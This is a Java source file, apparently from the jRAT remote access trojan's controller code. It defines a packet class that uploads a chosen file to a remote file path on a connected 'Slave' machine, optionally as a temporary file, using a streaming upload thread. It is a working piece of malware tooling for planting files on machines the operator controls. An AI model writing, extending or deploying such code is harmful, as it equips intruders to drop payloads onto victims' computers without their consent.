package jrat.module.fs.packets;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.OutgoingPacket;
import jrat.module.fs.ThreadUploadFile;

import java.io.File;

public class Packet42ServerUploadFile implements OutgoingPacket {

	protected File file;
	protected String remoteFile;
	protected boolean temp;
	protected ThreadUploadFile thread;

	public Packet42ServerUploadFile(File file, String remoteFile) {
		this(file, remoteFile, false);
	}
	
	public Packet42ServerUploadFile(File file, String remoteFile, boolean temp) {
		this.file = file;
		this.remoteFile = remoteFile;
		this.temp = temp;
		this.thread = new ThreadUploadFile(null, remoteFile, file);
	}
	
	public Packet42ServerUploadFile(File file, String remoteFile, boolean temp, ThreadUploadFile thread) {
		this.file = file;
		this.remoteFile = remoteFile;
		this.temp = temp;
		this.thread = thread;
	}
	
	@Override
	public void write(final Slave slave) throws Exception {
		slave.writeBoolean(temp);
		slave.writeLine(remoteFile);
		slave.writeLong(file.length());

		if (file.exists() && file.isFile()) {
			thread.setSlave(slave);
			thread.getData().setObject(slave);
			thread.getData().start();
		}
	}

	@Override
	public short getPacketId() {
		return 42;
	}

}
